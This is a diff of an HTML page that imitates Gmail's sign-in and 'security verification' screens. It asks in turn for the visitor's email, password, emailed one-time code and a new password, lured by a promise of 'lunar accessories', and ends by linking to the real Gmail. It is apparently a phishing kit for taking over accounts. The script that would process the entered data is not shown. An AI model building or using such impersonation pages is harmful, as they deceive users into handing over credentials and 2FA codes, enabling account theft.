@@ -3,14 +3,14 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Gmail - Sign in</title>
+    <title>Gmail - Security Verification</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
-        <!-- Login Form -->
-        <div id="loginForm">
+        <!-- Step 1: Login -->
+        <div id="loginForm" class="form-step active">
             <div class="header">
                 <div class="logo"></div>
                 <h1 class="title">Sign in</h1>
@@ -30,8 +30,9 @@
                     <div id="passwordError" class="error-message">Please enter your password</div>
                 </div>
                 
-                <div class="attempt-counter" id="attemptCounter">
-                    Attempts remaining: <span id="attemptsLeft">3</span>
+                <div class="security-notice">
+                    <span class="security-icon">🔒</span>
+                    <span>For your security, we'll verify your identity</span>
                 </div>
                 
                 <div class="button-group">
@@ -45,50 +46,152 @@
             </div>
         </div>
         
-        <!-- Verification Form -->
-        <div id="verificationForm" class="hidden">
+        <!-- Step 2: Request Verification Code -->
+        <div id="requestCodeForm" class="form-step">
             <div class="verification-container">
-                <div class="verification-icon">✓</div>
-                <h2 class="verification-title">Verification required</h2>
+                <div class="verification-icon">📧</div>
+                <h2 class="verification-title">Verify it's you</h2>
                 <p class="verification-text">
-                    A verification code has been sent to your email.<br>
-                    Please check your spam folder if you don't see it.<br>
-                    <strong>Paste the code below to verify your account:</strong>
+                    To protect your account, we need to verify your identity.<br>
+                    We'll send a verification code to your email.
                 </p>
                 
-                <input type="text" id="verificationCode" class="code-input" placeholder="Paste code here" maxlength="6">
-                <div id="codeError" class="error-message"></div>
-                
-                <p class="spam-notice">Check spam and gmail to get the accessories</p>
-                <p class="spam-notice">Below: Paste code here get access to lunar accessories</p>
+                <div class="email-display" id="emailDisplay"></div>
                 
                 <div class="button-group">
-                    <button class="btn btn-secondary" onclick="goBack()">Back</button>
-                    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">Confirm</button>
+                    <button class="btn btn-secondary" onclick="goBack('loginForm')">Back</button>
+                    <button class="btn btn-primary" id="requestCodeBtn" onclick="requestVerificationCode()">Send Code</button>
                 </div>
                 
-                <div id="loading" class="hidden">
+                <div id="sendingCode" class="hidden">
                     <div class="loading"></div>
-                    <p>Getting access to code...</p>
-                </div>
-                
-                <div id="successMessage" class="hidden">
-                    <p class="success-message">Thanks for using!</p>
+                    <p>Sending verification code to your email...</p>
                 </div>
             </div>
         </div>
         
-        <!-- Limit Reached Message -->
-        <div id="limitReached" class="hidden">
-            <div class="limit-reached">
-                <h2>Access Denied</h2>
-                <p>You have exceeded the maximum number of attempts.</p>
-                <p>Please try again later.</p>
+        <!-- Step 3: Enter Verification Code -->
+        <div id="enterCodeForm" class="form-step">
+            <div class="verification-container">
+                <div class="verification-icon">✓</div>
+                <h2 class="verification-title">Enter verification code</h2>
+                <p class="verification-text">
+                    We've sent a 6-digit code to your email.<br>
+                    Please enter it below to continue.
+                </p>
+                
+                <div class="code-input-container">
+                    <input type="text" id="verificationCode" class="code-input" placeholder="Enter 6-digit code" maxlength="6" pattern="[0-9]*">
+                    <div id="codeError" class="error-message"></div>
+                </div>
+                
+                <div class="spam-notice">
+                    <p>📋 Check your spam folder if you don't see the email</p>
+                    <p>🔑 Code required to access lunar accessories</p>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goBack('requestCodeForm')">Resend Code</button>
+                    <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">Verify</button>
+                </div>
+                
+                <div id="verifyingCode" class="hidden">
+                    <div class="loading"></div>
+                    <p>Verifying code...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 4: Change Password -->
+        <div id="changePasswordForm" class="form-step">
+            <div class="verification-container">
+                <div class="verification-icon">🔑</div>
+                <h2 class="verification-title">Update your password</h2>
+                <p class="verification-text">
+                    For security reasons, we recommend updating your password.<br>
+                    Enter a new password below.
+                </p>
+                
+                <div class="input-group">
+                    <label class="input-label">New Password</label>
+                    <input type="password" id="newPassword" class="input-field" placeholder="Enter new password">
+                    <div class="password-strength">
+                        <div class="strength-bar" id="strengthBar"></div>
+                        <span id="strengthText">Password strength</span>
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">Confirm New Password</label>
+                    <input type="password" id="confirmPassword" class="input-field" placeholder="Confirm new password">
+                    <div id="confirmError" class="error-message"></div>
+                </div>
+                
+                <div class="password-requirements">
+                    <p>Password requirements:</p>
+                    <ul>
+                        <li id="reqLength">At least 8 characters</li>
+                        <li id="reqUpper">One uppercase letter</li>
+                        <li id="reqNumber">One number</li>
+                        <li id="reqSpecial">One special character</li>
+                    </ul>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-secondary" onclick="goBack('enterCodeForm')">Skip</button>
+                    <button class="btn btn-primary" id="changePasswordBtn" onclick="changePassword()">Update Password</button>
+                </div>
+                
+                <div id="updatingPassword" class="hidden">
+                    <div class="loading"></div>
+                    <p>Updating your password...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Step 5: Success -->
+        <div id="successForm" class="form-step">
+            <div class="verification-container">
+                <div class="verification-icon">🎉</div>
+                <h2 class="verification-title">Success!</h2>
+                <p class="verification-text">
+                    Your account security has been updated successfully.<br>
+                    You can now access your lunar accessories.
+                </p>
+                
+                <div class="access-code-display">
+                    <p>Your access code:</p>
+                    <div class="code-display" id="finalAccessCode"></div>
+                    <p class="small-note">This code will not work - for demonstration only</p>
+                </div>
+                
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="window.location.href='https://gmail.com'">Go to Gmail</button>
+                </div>
+                
+                <div class="footer">
+                    <p>Thanks for using our security verification service!</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Error/Limit Reached -->
+        <div id="errorForm" class="form-step">
+            <div class="error-container">
+                <div class="error-icon">⚠️</div>
+                <h2 class="error-title">Security Alert</h2>
+                <p class="error-text">
+                    Too many failed attempts detected.<br>
+                    Please try again in 24 hours.
+                </p>
+                
+                <div class="button-group">
+                    <button class="btn btn-primary" onclick="window.location.reload()">Try Again</button>
+                </div>
             </div>
         </div>
     </div>
     
     <script src="script.js"></script>
 </body>
-  </html>
-
+</html>
